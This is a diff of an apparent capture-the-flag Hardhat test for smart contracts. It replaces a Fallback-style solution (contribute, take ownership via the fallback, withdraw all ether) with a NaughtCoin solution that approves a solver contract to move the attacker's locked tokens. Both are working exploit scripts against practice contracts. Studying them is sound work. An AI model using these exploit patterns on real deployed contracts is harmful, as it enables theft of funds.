@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] NaughtCoin', function () {
 
     let deployer, attacker;
     
@@ -13,34 +13,32 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
+            const ContractFactory = await ethers.getContractFactory('NaughtCoin');
             this.target = ContractFactory.attach("");
             
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
-            this.target = await ContractFactory.deploy();
+            const ContractFactory = await ethers.getContractFactory('NaughtCoin', deployer);
+            this.target = await ContractFactory.deploy(attacker.address);
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        const NaughtCoinSolverFactory = await ethers.getContractFactory('NaughtCoinSolver', attacker);
+        const NaughtCoinSolver = await NaughtCoinSolverFactory.deploy();
+        let amount = await this.target.balanceOf(attacker.address);
+        console.log(`\t attacker balance before : ${amount}`);
+        console.log(`\t giving allownce for contract...`);
+        let allowanceTX = await this.target.connect(attacker).approve(NaughtCoinSolver.address, amount); await allowanceTX.wait();
+        console.log(`\t allownce : ${await this.target.allowance(attacker.address, NaughtCoinSolver.address)}`);
+        let withdrawTX = await NaughtCoinSolver.connect(attacker).withdraw(this.target.address, amount); await withdrawTX.wait();
+        console.log(`\t attacker balance after  : ${await this.target.balanceOf(attacker.address)}`);
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
-        expect(await this.target.owner()).to.be.eq(attacker.address);
+        expect(parseInt(await this.target.balanceOf(attacker.address))).to.be.eq(0);
     });
 });
